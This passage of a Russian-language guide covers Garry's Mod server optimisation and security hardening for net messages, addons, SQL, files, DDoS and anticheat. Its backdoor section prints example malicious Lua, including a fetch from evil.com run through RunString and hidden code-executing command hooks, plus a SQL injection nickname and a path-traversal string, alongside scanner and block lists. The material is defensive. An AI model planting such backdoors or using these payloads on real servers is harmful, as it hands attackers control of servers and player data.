-- ✅ Использование ents.FindInSphere вместо ручной проверки дистанции
local nearbyEnts = ents.FindInSphere(pos, 500) -- Оптимизировано движком
```

### 2.6. Prop/Entity лимиты

```lua
-- ✅ Ограничение количества пропов на игрока
-- В конфигурации сервера:
sbox_maxprops 50          -- Лимит пропов
sbox_maxragdolls 10       -- Лимит рэгдоллов
sbox_maxeffects 20        -- Лимит эффектов
sbox_maxnpcs 10           -- Лимит NPC

-- ✅ Автоматическая очистка при переполнении
hook.Add("PlayerSpawnedProp", "PropCleanup", function(ply, model, ent)
    ply.PropCount = (ply.PropCount or 0) + 1

    if ply.PropCount > 50 then
        ent:Remove()
        ply:ChatPrint("Превышен лимит пропов!")
    end
end)

-- ✅ Автоматическая очистка мусора
timer.Create("ServerCleanup", 300, 0, function() -- Каждые 5 минут
    local removed = 0
    for _, ent in ipairs(ents.GetAll()) do
        if ent:GetClass() == "prop_physics" and not IsValid(ent:GetPhysicsObject()) then
            ent:Remove()
            removed = removed + 1
        end
    end
    if removed > 0 then
        print("[Cleanup] Removed " .. removed .. " invalid props")
    end
end)
```

### 2.7. Tickrate и серверные настройки

```
// server.cfg — ключевые параметры оптимизации

// Тикрейт (по умолчанию 66)
// Понижение до 33 снижает нагрузку в ~2 раза, но ухудшает отзывчивость
sv_maxrate 0              // Без лимита скорости передачи
sv_minrate 20000          // Минимальная скорость
sv_maxupdaterate 66       // Макс. кол-во обновлений клиенту в секунду
sv_minupdaterate 33       // Мин. кол-во обновлений

// Оптимизация физики
sv_turbophysics 1         // Упрощённая физика для неактивных объектов
phys_timescale 1          // Скорость физической симуляции
sv_maxunlag 1             // Макс. время лаг-компенсации (сек)

// Сетевые настройки
net_maxfilesize 64        // Макс. размер файла для передачи (МБ)
sv_maxcmdrate 66          // Макс. частота команд от клиента
sv_mincmdrate 33          // Мин. частота команд
```

---

## 3. Оптимизация: Сеть (Networking)

### 3.1. Net-сообщения: оптимизация размера

```lua
-- ❌ ПЛОХО — отправка избыточных данных
util.AddNetworkString("PlayerData")

net.Start("PlayerData")
    net.WriteString(ply:Nick())               -- Можно получить на клиенте
    net.WriteString(ply:SteamID())            -- Можно получить на клиенте
    net.WriteFloat(ply:GetPos().x)            -- 32 бита
    net.WriteFloat(ply:GetPos().y)            -- 32 бита
    net.WriteFloat(ply:GetPos().z)            -- 32 бита
    net.WriteFloat(ply:Health())              -- 32 бита для целого числа!
net.Send(target)

-- ✅ ХОРОШО — минимум данных
net.Start("PlayerData")
    net.WriteEntity(ply)                       -- 16 бит (EntIndex)
    net.WriteVector(ply:GetPos())              -- Оптимизировано движком
    net.WriteUInt(ply:Health(), 8)             -- 8 бит (0-255)
net.Send(target)
```

**Размеры типов данных в net-сообщениях:**

| Функция | Размер | Примечание |
|---------|--------|-----------|
| `net.WriteBit` | 1 бит | Для boolean |
| `net.WriteBool` | 1 бит | Обёртка над WriteBit |
| `net.WriteUInt(val, bits)` | N бит | Указываешь кол-во бит |
| `net.WriteInt(val, bits)` | N бит | Со знаком |
| `net.WriteFloat` | 32 бита | Дробные числа |
| `net.WriteDouble` | 64 бита | ❌ Избегать |
| `net.WriteString` | 8*(len+1) бит | Дорого! Кэшировать ID |
| `net.WriteEntity` | 16 бит | Оптимально |
| `net.WriteVector` | 96 бит (3×32) | 3 Float |
| `net.WriteAngle` | 96 бит (3×32) | 3 Float |
| `net.WriteTable` | Переменный | ❌ ОЧЕНЬ дорого, избегать! |

### 3.2. Уменьшение частоты net-сообщений

```lua
-- ❌ ПЛОХО — рассылка каждый тик
hook.Add("Think", "SyncData", function()
    net.Start("SyncHP")
        net.WriteUInt(ply:Health(), 8)
    net.Broadcast()
end)

-- ✅ ХОРОШО — рассылка при изменении, с тротлингом
local lastBroadcast = {}

hook.Add("EntityTakeDamage", "SyncOnDamage", function(ent, dmg)
    if not ent:IsPlayer() then return end

    local key = ent:SteamID64()
    if (lastBroadcast[key] or 0) + 0.2 > CurTime() then return end
    lastBroadcast[key] = CurTime()

    net.Start("SyncHP")
        net.WriteEntity(ent)
        net.WriteUInt(ent:Health(), 8)
    net.Broadcast()
end)
```

### 3.3. RecipientFilter — не отправлять всем

```lua
-- ❌ ПЛОХО — Broadcast когда нужно только ближайшим
net.Start("LocalEffect")
net.Broadcast() -- Все 128 игроков получают сообщение о локальном эффекте

-- ✅ ХОРОШО — Отправка только тем, кто рядом
net.Start("LocalEffect")
    net.WriteVector(effectPos)
net.Send(GetNearbyPlayers(effectPos, 1000))

function GetNearbyPlayers(pos, radius)
    local radiusSqr = radius * radius
    local result = {}
    for _, ply in ipairs(player.GetAll()) do
        if ply:GetPos():DistToSqr(pos) <= radiusSqr then
            result[#result + 1] = ply
        end
    end
    return result
end
```

---

## 4. Безопасность: Net-запросы

> [!CAUTION]
> Net-запросы — **основной вектор атаки** на GMod-серверы. Без валидации любой клиент может вызвать серверный код с произвольными данными.

### 4.1. Основные уязвимости net-сообщений

#### 4.1.1. Отсутствие валидации данных

```lua
-- ❌ УЯЗВИМО — нет проверок
util.AddNetworkString("GiveMoney")

net.Receive("GiveMoney", function(len, ply)
    local amount = net.ReadInt(32)
    local target = net.ReadEntity()

    target:addMoney(amount) -- Клиент может отправить любую сумму!
end)

-- ✅ БЕЗОПАСНО — полная валидация
net.Receive("GiveMoney", function(len, ply)
    -- 1. Проверяем валидность отправителя
    if not IsValid(ply) then return end
    if not ply:Alive() then return end

    -- 2. Читаем и валидируем данные
    local amount = net.ReadInt(32)
    if amount <= 0 or amount > 10000 then return end        -- Лимит суммы
    if amount ~= math.floor(amount) then return end          -- Только целые числа

    local target = net.ReadEntity()
    if not IsValid(target) or not target:IsPlayer() then return end

    -- 3. Проверяем бизнес-логику
    if ply:getDarkRPVar("money") < amount then return end    -- Достаточно денег?
    if ply:GetPos():DistToSqr(target:GetPos()) > 300*300 then return end -- Рядом?

    -- 4. Выполняем действие
    ply:addMoney(-amount)
    target:addMoney(amount)

    -- 5. Логирование
    ServerLog(string.format("[Money] %s gave %d to %s",
        ply:Nick(), amount, target:Nick()))
end)
```

#### 4.1.2. Rate Limiting (Защита от спама net-запросами)

```lua
-- ✅ Универсальный Rate Limiter для net-сообщений
local NetRateLimiter = {
    limits = {},       -- Конфигурация лимитов
    tracking = {},     -- Трекинг запросов
}

function NetRateLimiter:SetLimit(netName, maxRequests, timeWindow)
    self.limits[netName] = {
        max = maxRequests,
        window = timeWindow
    }
end

function NetRateLimiter:Check(netName, ply)
    local limit = self.limits[netName]
    if not limit then return true end

    local steamID = ply:SteamID64()
    local key = netName .. "_" .. steamID

    if not self.tracking[key] then
        self.tracking[key] = {count = 0, resetTime = CurTime() + limit.window}
    end

    local track = self.tracking[key]

    -- Сброс окна
    if CurTime() > track.resetTime then
        track.count = 0
        track.resetTime = CurTime() + limit.window
    end

    track.count = track.count + 1

    if track.count > limit.max then
        -- Логируем подозрительную активность
        print(string.format("[NetRateLimit] %s (%s) exceeded limit for %s: %d/%d",
            ply:Nick(), steamID, netName, track.count, limit.max))
        return false
    end

    return true
end

-- Использование:
NetRateLimiter:SetLimit("BuyItem", 5, 1)      -- 5 запросов в секунду
NetRateLimiter:SetLimit("ChatMessage", 3, 1)   -- 3 сообщения в секунду
NetRateLimiter:SetLimit("SpawnProp", 10, 5)    -- 10 пропов за 5 секунд

net.Receive("BuyItem", function(len, ply)
    if not NetRateLimiter:Check("BuyItem", ply) then
        -- Опционально: кик при сильном превышении
        return
    end

    -- ... нормальная обработка ...
end)
```

#### 4.1.3. Проверка размера net-сообщения

```lua
-- ✅ Проверка размера входящего сообщения
net.Receive("UserData", function(len, ply)
    -- len — размер сообщения в БИТАХ
    if len > 8192 then -- > 1 КБ
        print("[Security] Oversized net message from " .. ply:Nick() .. ": " .. len .. " bits")
        return
    end

    -- ... обработка ...
end)
```

### 4.2. Чеклист безопасности net-сообщений

| Проверка | Описание | Критичность |
|----------|----------|-------------|
| `IsValid(ply)` | Игрок существует | 🔴 Критично |
| `ply:Alive()` | Игрок жив (если нужно) | 🟡 Важно |
| Тип данных | Значение соответствует ожидаемому типу | 🔴 Критично |
| Диапазон значений | Числа в допустимых пределах | 🔴 Критично |
| `IsValid(entity)` | Энтити существует | 🔴 Критично |
| `entity:IsPlayer()` | Энтити — игрок (если ожидается) | 🔴 Критично |
| Дистанция | Игрок достаточно близко к объекту | 🟡 Важно |
| Permissions | Игрок имеет право на действие | 🔴 Критично |
| Rate Limit | Запросы не слишком часты | 🟡 Важно |
| Размер сообщения | Не слишком большое сообщение | 🟡 Важно |
| String Length | Строки ограничены по длине | 🔴 Критично |
| Table Size | Таблицы ограничены по размеру | 🔴 Критично |

---

## 5. Безопасность: Exploits

### 5.1. Lua Backdoors

> [!WARNING]
> Многие бесплатные и даже платные аддоны содержат обфусцированные бэкдоры, дающие злоумышленнику полный контроль над сервером.

**Признаки бэкдоров:**

```lua
-- ⚠️ Подозрительные паттерны в коде аддонов:

-- 1. Обфусцированный код
local _0x1a2b = "\x52\x75\x6E\x53\x74\x72\x69\x6E\x67"  -- "RunString" в hex
_G[_0x1a2b](data)

-- 2. HTTP-загрузка и выполнение кода
http.Fetch("http://evil.com/backdoor.lua", function(body)
    RunString(body)  -- ❌ Выполнение произвольного кода!
end)

-- 3. Скрытые конколь-команды
concommand.Add("__sv_exec", function(ply, cmd, args)
    RunString(table.concat(args, " "))
end)

-- 4. Использование CompileString
local func = CompileString(encodedPayload, "")
func()

-- 5. Скрытые net-сообщения
util.AddNetworkString("__internal_update")
net.Receive("__internal_update", function(len, ply)
    RunString(net.ReadString())
end)
```

**Защита:**

```lua
-- ✅ Блокировка опасных функций
-- В autorun серверного файла (загружается первым):
local dangerousFuncs = {"RunString", "CompileString", "RunStringEx"}

for _, funcName in ipairs(dangerousFuncs) do
    local original = _G[funcName]
    _G[funcName] = function(code, ...)
        -- Логируем все вызовы
        local info = debug.getinfo(2)
        local source = info and info.source or "unknown"
        local line = info and info.currentline or 0

        print(string.format("[SECURITY] %s called from %s:%d",
            funcName, source, line))

        -- Можно заблокировать полностью или разрешить только из доверенных файлов
        if not string.find(source, "trusted_addon", 1, true) then
            print("[SECURITY] BLOCKED: " .. funcName)
            return
        end

        return original(code, ...)
    end
end

-- ✅ Блокировка опасных HTTP-запросов
local originalHTTPFetch = http.Fetch
http.Fetch = function(url, ...)
    -- Whitelist доменов
    local allowedDomains = {
        "steamcommunity.com",
        "api.steampowered.com",
        "your-server-api.com",
    }

    local allowed = false
    for _, domain in ipairs(allowedDomains) do
        if string.find(url, domain, 1, true) then
            allowed = true
            break
        end
    end

    if not allowed then
        print("[SECURITY] Blocked HTTP request to: " .. url)
        return
    end

    return originalHTTPFetch(url, ...)
end
```

### 5.2. Clientside Exploits

**Проблема:** Клиент может использовать чит-меню / инжекторы для вызова серверных функций.

```lua
-- ⚠️ Что может делать клиент с читами:
-- 1. Отправлять любые net-сообщения
-- 2. Вызывать любые concommand'ы
-- 3. Изменять cl_* конвары
-- 4. Подменять данные (модели, позиции)

-- ✅ НИКОГДА не доверять клиенту:

-- ❌ Доверие клиентскому конвару
if ply:GetInfoNum("my_addon_vip", 0) == 1 then
    -- VIP функции — клиент просто меняет конвар!
end

-- ✅ Проверка на сервере
if IsPlayerVIP(ply) then -- Проверка из серверной БД
    -- VIP функции
end
```

### 5.3. ConCommand Exploits

```lua
-- ❌ УЯЗВИМО — открытые команды без защиты
concommand.Add("give_weapon", function(ply, cmd, args)
    ply:Give(args[1]) -- Любой игрок может выдать себе любое оружие!
end)

-- ✅ БЕЗОПАСНО — валидация и permissions
concommand.Add("give_weapon", function(ply, cmd, args)
    if not IsValid(ply) then return end
    if not ply:IsAdmin() then return end

    local weapon = args[1]
    if not weapon then return end

    -- Whitelist оружия
    local allowedWeapons = {
        ["weapon_pistol"] = true,
        ["weapon_smg1"] = true,
    }

    if not allowedWeapons[weapon] then
        ply:ChatPrint("Недопустимое оружие!")
        return
    end

    ply:Give(weapon)
end)
```

### 5.4. SQL Injection (SQLite)

```lua
-- ❌ УЯЗВИМО — прямая конкатенация
local nick = ply:Nick()
sql.Query("SELECT * FROM players WHERE name = '" .. nick .. "'")
-- Игрок с ником: ' OR 1=1; DROP TABLE players; --

-- ✅ БЕЗОПАСНО — экранирование
local nick = sql.SQLStr(ply:Nick()) -- Автоматическое экранирование
sql.Query("SELECT * FROM players WHERE name = " .. nick)

-- ✅ ЕЩЁ ЛУЧШЕ — использование SteamID64 как ключа (не зависит от ника)
local steamID = ply:SteamID64()
sql.Query("SELECT * FROM players WHERE steamid = " .. sql.SQLStr(steamID))
```

### 5.5. File System Exploits

```lua
-- ❌ УЯЗВИМО — пользовательский ввод в путях файлов
net.Receive("SaveData", function(len, ply)
    local filename = net.ReadString()
    file.Write("data/" .. filename, "data") -- Path traversal: "../../../cfg/server.cfg"
end)

-- ✅ БЕЗОПАСНО — санитизация имени файла
net.Receive("SaveData", function(len, ply)
    local filename = net.ReadString()

    -- Удаляем всё кроме буквенно-цифровых символов
    filename = string.gsub(filename, "[^%w_%-]", "")

    if filename == "" or #filename > 64 then return end

    -- Фиксированный путь + безопасное имя
    file.Write("data/playerdata/" .. ply:SteamID64() .. "/" .. filename .. ".txt", "data")
end)
```

---

## 6. Безопасность: DDoS и сетевые атаки

### 6.1. Типы DDoS-атак на GMod-серверы

| Тип атаки | Описание | Уровень угрозы |
|-----------|----------|---------------|
| **UDP Flood** | Массовая отправка UDP-пакетов на игровой порт | 🔴 Критично |
| **Query Flood** | Спам Source Query Protocol запросами (A2S_INFO) | 🔴 Критично |
| **Connection Flood** | Массовые попытки подключения | 🟡 Высокий |
| **Net Message Flood** | Спам net-сообщениями от подключённого клиента | 🟡 Высокий |
| **Amplification Attack** | Использование сервера как усилителя трафика | 🟡 Высокий |
| **Slowloris** | Медленные подключения, занимающие слоты | 🟠 Средний |

### 6.2. Защита на уровне хостинга

```
// ✅ Основные настройки сервера для защиты от DDoS

// Ограничение Source Query
sv_max_queries_sec_global 30        // Макс. глобальных запросов в секунду
sv_max_queries_sec 3                // Макс. запросов в секунду на IP
sv_max_queries_window 30            // Окно отслеживания (сек)

// Ограничение подключений
sv_max_connects_sec 2               // Макс. подключений в секунду
sv_max_connects_sec_global 5        // Макс. глобальных подключений в секунду

// Скрытие сервера от сканеров (опционально)
sv_visiblemaxplayers -1             // Скрыть реальное количество слотов
host_info_show 0                    // Скрыть информацию о сервере (осторожно!)
```

### 6.3. Firewall-правила (Linux / iptables)

```bash
# ✅ Базовые правила для защиты GMod-сервера

# Ограничение скорости UDP на игровой порт (например, 27015)
iptables -A INPUT -p udp --dport 27015 -m state --state NEW \
    -m recent --set --name gmod_udp

iptables -A INPUT -p udp --dport 27015 -m state --state NEW \
    -m recent --update --seconds 1 --hitcount 20 --name gmod_udp -j DROP

# Ограничение новых подключений
iptables -A INPUT -p udp --dport 27015 \
    -m hashlimit --hashlimit-upto 10/sec --hashlimit-burst 20 \
    --hashlimit-mode srcip --hashlimit-name gmod_conn -j ACCEPT

iptables -A INPUT -p udp --dport 27015 -j DROP

# Блокировка фрагментированных пакетов (часто используются в атаках)
iptables -A INPUT -f -j DROP

# Защита от SYN-flood (если используется RCON через TCP)
iptables -A INPUT -p tcp --dport 27015 --syn \
    -m limit --limit 1/s --limit-burst 3 -j ACCEPT
```

### 6.4. Защита от Connection Flood (внутри GMod)

```lua
-- ✅ Защита от массовых подключений
local connectionAttempts = {}
local BAN_THRESHOLD = 5       -- Попыток до бана
local WINDOW_SECONDS = 30     -- Окно отслеживания
local BAN_DURATION = 300       -- Бан на 5 минут

hook.Add("CheckPassword", "AntiConnectionFlood", function(steamID64, ip, svPassword, clPassword, name)
    ip = string.match(ip, "(%d+%.%d+%.%d+%.%d+)") -- Убираем порт

    if not connectionAttempts[ip] then
        connectionAttempts[ip] = {count = 0, firstAttempt = os.time()}
    end

    local data = connectionAttempts[ip]

    -- Сброс окна
    if os.time() - data.firstAttempt > WINDOW_SECONDS then
        data.count = 0
        data.firstAttempt = os.time()
    end

    data.count = data.count + 1

    if data.count > BAN_THRESHOLD then
        -- Временный бан IP
        RunConsoleCommand("addip", BAN_DURATION / 60, ip)
        print("[Security] Banned IP for connection flood: " .. ip)
        return false, "Connection rate exceeded. Try again later."
    end
end)

-- Очистка таблицы отслеживания
timer.Create("CleanConnectionAttempts", 60, 0, function()
    local now = os.time()
    for ip, data in pairs(connectionAttempts) do
        if now - data.firstAttempt > WINDOW_SECONDS * 2 then
            connectionAttempts[ip] = nil
        end
    end
end)
```

### 6.5. Защита от Net Message Flood

```lua
-- ✅ Глобальный мониторинг net-сообщений на игрока
local playerNetStats = {}

hook.Add("PlayerDisconnected", "CleanNetStats", function(ply)
    playerNetStats[ply:SteamID64()] = nil
end)

-- Обёртка для всех net.Receive
local originalNetReceive = net.Receive
function net.Receive(name, callback)
    originalNetReceive(name, function(len, ply)
        if not IsValid(ply) then return end

        local sid = ply:SteamID64()
        if not playerNetStats[sid] then
            playerNetStats[sid] = {
                total = 0,
                perSecond = 0,
                lastReset = CurTime(),
                warnings = 0
            }
        end

        local stats = playerNetStats[sid]
        stats.total = stats.total + 1
        stats.perSecond = stats.perSecond + 1

        -- Сброс счётчика каждую секунду
        if CurTime() - stats.lastReset > 1 then
            stats.perSecond = 0
            stats.lastReset = CurTime()
        end

        -- Порог: 50 net-сообщений в секунду
        if stats.perSecond > 50 then
            stats.warnings = stats.warnings + 1

            if stats.warnings > 10 then
                ply:Kick("Net message flood detected")
                print("[Security] Kicked " .. ply:Nick() .. " for net flood")
                return
            end

            return -- Дропаем сообщение
        end

        -- Выполняем оригинальный callback
        callback(len, ply)
    end)
end
```

---

## 7. Безопасность: Серверные уязвимости

### 7.1. RCON-безопасность

```
// ✅ Настройка RCON
rcon_password "ОЧЕНЬ_ДЛИННЫЙ_СЛОЖНЫЙ_ПАРОЛЬ_С_СПЕЦСИМВОЛАМИ"

// Опционально: отключить RCON если не используется
// sv_rcon_maxfailures 3            // Макс. неудачных попыток
// sv_rcon_minfailuretime 600       // Окно отслеживания неудач (сек)
// sv_rcon_banpenalty 1440          // Бан за превышение (мин)
```

### 7.2. Workshop-контент и аддоны

> [!IMPORTANT]
> Каждый аддон — потенциальная точка входа. Проверяйте **каждый** устанавливаемый аддон.

**Чеклист проверки аддона:**

- [ ] Код читаемый, не обфусцирован
- [ ] Нет `RunString`, `CompileString` с внешними данными
- [ ] Нет `http.Fetch`/`http.Post` к неизвестным доменам
- [ ] Нет скрытых `net.Receive` с выполнением кода
- [ ] Нет `concommand.Add` без проверки прав
- [ ] Нет `file.Read`/`file.Write` с пользовательским вводом в пути
- [ ] Net-сообщения имеют валидацию данных
- [ ] Нет прямого SQL без экранирования

```lua
-- ✅ Скрипт для автоматического сканирования аддонов
-- Запускать в серверной консоли

local suspicious = {
    "RunString", "CompileString", "RunStringEx",
    "BroadcastLua", "http%.Fetch", "http%.Post",
    "game%.ConsoleCommand",
}

local function ScanFile(path)
    local content = file.Read(path, "GAME")
    if not content then return end

    for _, pattern in ipairs(suspicious) do
        if string.find(content, pattern) then
            print("[SCAN] " .. pattern .. " found in: " .. path)
        end
    end
end

local function ScanDirectory(dir)
    local files, dirs = file.Find(dir .. "/*", "GAME")

    for _, f in ipairs(files or {}) do
        if string.EndsWith(f, ".lua") then
            ScanFile(dir .. "/" .. f)
        end
    end

    for _, d in ipairs(dirs or {}) do
        ScanDirectory(dir .. "/" .. d)
    end
end

ScanDirectory("addons")
```

### 7.3. Защита серверных файлов

```lua
-- ✅ Запрет скачивания серверных файлов через resource.AddFile
-- НЕ добавляйте серверные файлы в resource!

-- ❌ ОПАСНО — серверный конфиг доступен клиентам
resource.AddFile("cfg/server.cfg")

-- ✅ Только необходимые файлы
resource.AddFile("materials/my_addon/icon.png")
resource.AddFile("sound/my_addon/effect.wav")

-- ✅ Использование Workshop для контента (не resource.AddFile)
resource.AddWorkshop("123456789") -- Workshop ID
```

### 7.4. Privilege Escalation

```lua
-- ❌ УЯЗВИМО — Проверка по нику
if ply:Nick() == "Admin" then
    -- Любой может взять ник "Admin"!
end

-- ❌ УЯЗВИМО — Проверка по SteamID без формата
if ply:SteamID() == args[1] then
    -- Клиент может подменить аргумент
end

-- ✅ БЕЗОПАСНО — Проверка через ULX/CAMI/Встроенные группы
if ply:IsSuperAdmin() then
    -- Встроенная проверка Source Engine
end

-- ✅ БЕЗОПАСНО — Whitelist SteamID64 на сервере
local SUPERADMINS = {
    ["76561198000000000"] = true,
    ["76561198000000001"] = true,
}

function IsServerOwner(ply)
    return SUPERADMINS[ply:SteamID64()] == true
end
```

---

## 8. Безопасность: Античит и Анти-эксплойт

### 8.1. Анти-спидхак

```lua
-- ✅ Серверная проверка скорости передвижения
hook.Add("Move", "AntiSpeedhack", function(ply, mv)
    local maxSpeed = ply:GetMaxSpeed() * 1.15 -- 15% допуск на лаг

    local velocity = mv:GetVelocity()
    local speed = velocity:Length2D()

    if speed > maxSpeed and ply:IsOnGround() then
        ply._speedViolations = (ply._speedViolations or 0) + 1

        if ply._speedViolations > 100 then -- ~1.5 сек нарушений
            ply:Kick("Speed anomaly detected")
        end
    else
        ply._speedViolations = math.max(0, (ply._speedViolations or 0) - 1)
    end
end)
```

### 8.2. Анти-телепорт / Noclip exploit

```lua
-- ✅ Отслеживание телепортации
local MAX_TELEPORT_DIST = 1000 -- Макс. допустимая дистанция за тик
local playerLastPos = {}

hook.Add("PlayerPostThink", "AntiTeleport", function(ply)
    local steamID = ply:SteamID64()
    local curPos = ply:GetPos()

    if playerLastPos[steamID] and ply:GetMoveType() ~= MOVETYPE_NOCLIP then
        local dist = curPos:Distance(playerLastPos[steamID])

        if dist > MAX_TELEPORT_DIST then
            -- Исключаем легитимные телепорты
            if not ply._legitimateTeleport then
                ply:SetPos(playerLastPos[steamID])
                print("[AntiCheat] Teleport blocked for " .. ply:Nick())
            end
        end

        ply._legitimateTeleport = nil
    end

    playerLastPos[steamID] = curPos
end)

-- При легитимном телепорте устанавливаем флаг
function SafeTeleport(ply, pos)
    ply._legitimateTeleport = true
    ply:SetPos(pos)
end
```

### 8.3. Анти-пропкилл / PropSpam

```lua
-- ✅ Защита от пропкилла и проп-спама
local propSpawnTracker = {}

hook.Add("PlayerSpawnProp", "AntiPropSpam", function(ply, model)
    local steamID = ply:SteamID64()

    if not propSpawnTracker[steamID] then
        propSpawnTracker[steamID] = {count = 0, lastReset = CurTime()}
    end

    local tracker = propSpawnTracker[steamID]

    -- Сброс каждую секунду
    if CurTime() - tracker.lastReset > 1 then
        tracker.count = 0
        tracker.lastReset = CurTime()
    end

    tracker.count = tracker.count + 1

    -- Лимит: 5 пропов в секунду
    if tracker.count > 5 then
        ply:ChatPrint("Слишком быстрый спавн пропов!")
        return false
    end
end)

-- Защита от prop push/kill
hook.Add("PhysgunPickup", "AntiPropKill", function(ply, ent)
    -- Запрет поднятия слишком тяжёлых/больших пропов
    local phys = ent:GetPhysicsObject()
    if IsValid(phys) then
        if phys:GetMass() > 10000 then
            return false
        end
    end
end)
```

### 8.4. Защита от крашеров (Entity / Prop Crash)

```lua
-- ✅ Блокировка опасных моделей
local blockedModels = {
    ["models/error.mdl"] = true,
    -- Добавьте модели, вызывающие краш
}

hook.Add("PlayerSpawnProp", "BlockCrashModels", function(ply, model)
    model = string.lower(model)

    if blockedModels[model] then
        ply:ChatPrint("Эта модель заблокирована!")
        return false
    end

    -- Проверка валидности модели
    if not util.IsValidModel(model) then
        return false
    end
end)

-- ✅ Защита от entity crash (слишком много constraint'ов)
hook.Add("CanTool", "LimitConstraints", function(ply, tr, tool)
    if tool == "weld" or tool == "rope" or tool == "elastic" then
        local ent = tr.Entity

        if IsValid(ent) then
            local constraints = constraint.GetTable(ent)
            if #constraints > 20 then
                ply:ChatPrint("Слишком много ограничений на объекте!")
                return false
            end
        end
    end
end)
```

---

## 9. Общие рекомендации

### 9.1. Структура безопасного аддона

```
addon/
├── lua/
│   ├── autorun/
│   │   ├── server/
│   │   │   └── sv_init.lua        -- Серверная инициализация
│   │   └── client/
│   │       └── cl_init.lua        -- Клиентская инициализация
│   ├── my_addon/
│   │   ├── server/
│   │   │   ├── sv_database.lua    -- БД (только сервер!)
│   │   │   ├── sv_networking.lua  -- Net-обработчики
│   │   │   └── sv_security.lua   -- Проверки безопасности
│   │   ├── client/
│   │   │   ├── cl_hud.lua         -- HUD (только клиент)
│   │   │   ├── cl_networking.lua  -- Net-отправка
│   │   │   └── cl_ui.lua         -- Интерфейс
│   │   └── shared/
│   │       ├── sh_config.lua      -- Общий конфиг
│   │       └── sh_enums.lua       -- Общие константы
```

### 9.2. Мониторинг производительности

```lua
-- ✅ Профайлер для отслеживания тяжёлых хуков
local hookProfile = {}

local function ProfileHook(eventName, hookName, callback)
    hook.Add(eventName, hookName, function(...)
        local startTime = SysTime()
        local results = {callback(...)}
        local elapsed = SysTime() - startTime

        if not hookProfile[hookName] then
            hookProfile[hookName] = {total = 0, calls = 0, max = 0}
        end

        local data = hookProfile[hookName]
        data.total = data.total + elapsed
        data.calls = data.calls + 1
        data.max = math.max(data.max, elapsed)

        return unpack(results)
    end)
end

-- Вывод статистики
concommand.Add("profile_hooks", function(ply)
    if IsValid(ply) and not ply:IsSuperAdmin() then return end

    print("=== Hook Performance ===")
    for name, data in SortedPairsByMemberValue(hookProfile, "total", true) do
        print(string.format("%-40s | Total: %.4fms | Calls: %d | Avg: %.4fms | Max: %.4fms",
            name,
            data.total * 1000,
            data.calls,
            (data.total / data.calls) * 1000,
            data.max * 1000
        ))
    end
end)
```

### 9.3. Чеклист перед запуском сервера

#### Оптимизация
- [ ] 3D2D-элементы имеют проверку дистанции и LOD
- [ ] Рендер-хуки фильтруют depth/skybox-проходы (`bDrawingDepth`/`bDrawingSkybox`)
- [ ] HUD не создаёт объекты в рендер-хуках (шрифты, цвета, материалы, строки, замыкания)
- [ ] `ScrW()`/`ScrH()` и `surface.GetTextSize` кэшированы, пересчёт по `OnScreenSizeChanged`
- [ ] Глобальные функции локализованы в горячих путях (upvalue)
- [ ] Временные хуки снимаются через `hook.Remove` / entity-идентификатор
- [ ] `HUDShouldDraw` использует lookup-таблицу
- [ ] Think-хуки используют тротлинг (не каждый тик)
- [ ] Коллизии отключены для декоративных объектов
- [ ] Звуки не воспроизводятся без проверки дистанции
- [ ] Net-сообщения минимальны по размеру
- [ ] `ents.Find*` результаты кэшируются
- [ ] Используются `NetworkVar` (DTVar) вместо `NW`/`NW2`
- [ ] Серверные настройки `sv_max*` оптимизированы
- [ ] Лимиты пропов и энтити установлены

#### Безопасность
- [ ] Все net.Receive имеют валидацию
- [ ] Rate Limiting на критичных net-сообщениях
- [ ] `RunString`/`CompileString` заблокированы или логируются
- [ ] HTTP-запросы ограничены whitelist'ом доменов
- [ ] SQL-запросы используют `sql.SQLStr`
- [ ] ConCommand'ы проверяют права доступа
- [ ] Аддоны просканированы на бэкдоры
- [ ] RCON пароль сложный или RCON отключён
- [ ] Файлы server.cfg недоступны клиентам
- [ ] Firewall настроен (rate limiting на UDP)
- [ ] Защита от connection flood активна
- [ ] Античит-проверки на скорость, телепортацию, проп-спам
- [ ] Логирование подозрительной активности

---

> [!TIP]
> **Регулярное обслуживание:** проводите аудит аддонов при каждом обновлении, следите за логами безопасности и тестируйте производительность под нагрузкой. Используйте инструменты профилирования (`profile_hooks` или аддоны вроде `Lua Profiler`) для выявления «бутылочных горлышек».
